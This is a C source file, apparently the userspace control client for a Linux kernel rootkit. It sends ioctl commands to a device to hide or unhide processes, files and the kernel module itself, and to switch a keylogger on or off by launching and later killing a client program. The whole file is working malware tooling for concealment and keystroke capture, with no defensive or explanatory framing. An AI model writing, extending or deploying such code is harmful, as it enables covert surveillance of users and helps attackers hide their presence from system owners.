#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

#include "kl.h"

int main(int argv, char *argc[]) {
  int fd;
  struct kl_req req;
  
  int ret;
  int cmd;
  char *pid;
  char *file_path;
  
  char client_path[MAX_BUF_LEN];
  int cid;

  if (argv < 2) {
    printf("Usage: %s <cmd>\n", argc[0]);
    return 1;
  } else if (argv == 2) {
    printf("Usage: %s %s <cmd>\n", argc[0], argc[1]);
    return 1;
  } else if (argv > 4) {
    printf("Too many arguments\n");
    return 1;
  }

  if (strcmp(argc[2], "proc") == 0) {
    if (argv < 4) {
      printf("Usage: %s %s %s <pid>\n", argc[0], argc[1], argc[2]);
      return 1;
    }
    pid = argc[3];
    cmd = strcmp(argc[1], "hide") == 0 ? KL_CMD_HIDE_PROC : KL_CMD_UNHIDE_PROC;
  } else if (strcmp(argc[2], "file") == 0) {
    if (argv < 4) {
      printf("Usage: %s %s %s <file path>\n", argc[0], argc[1], argc[2]);
      return 1;
    }
    file_path = argc[3];
    cmd = strcmp(argc[1], "hide") == 0 ? KL_CMD_HIDE_FILE : KL_CMD_UNHIDE_FILE;
  } else if (strcmp(argc[1], "keylog") == 0) {
    cmd = strcmp(argc[2], "on") == 0 ? KL_CMD_KEYLOG_ON : KL_CMD_KEYLOG_OFF;
  } else if (strcmp(argc[2], "mod") == 0) {
    cmd = strcmp(argc[1], "hide") == 0 ? KL_CMD_HIDE_MOD : KL_CMD_UNHIDE_MOD;
  } else {
    printf("Invalid command\n");
    return 1;
  }

  fd = open(KL_PATH, O_RDWR);
  if (fd < 0) {
    perror("open");
    return 1;
  }

  memset(&req, 0, sizeof(struct kl_req));

  switch (cmd) {
  case KL_CMD_HIDE_PROC:
  case KL_CMD_UNHIDE_PROC:
    strncpy(req.pid, pid, sizeof(req.pid));
    break;
  case KL_CMD_HIDE_FILE:
  case KL_CMD_UNHIDE_FILE:
    strncpy(req.file_path, file_path, sizeof(req.file_path));
    break;
  case KL_CMD_KEYLOG_ON:
    if(getcwd(client_path, MAX_BUF_LEN) == NULL) {
      perror("cannot get working directory");
      return 1;
    }
    
    cid = fork();
    if(cid < 0)
    {
      perror("fork failed");
      return 1;
    } else if(cid == 0) {
      char full_path[MAX_BUF_LEN];
      
      snprintf(full_path, sizeof(full_path), "%s/%s", client_path, KL_CLIENT);
      char *argv[] = {full_path, NULL};

      execv(full_path, argv);
      perror("exec failed\n");
    } else {
      req.cid = cid;
    }
    break;
  case KL_CMD_KEYLOG_OFF:
    break;
  }

  ret = ioctl(fd, cmd, &req);
  if (ret < 0) {
    perror("ioctl");
    return 1;
  }

  if(cmd == KL_CMD_KEYLOG_OFF) {
    kill(ret, SIGKILL);
  }

  close(fd);
  return 0;
}
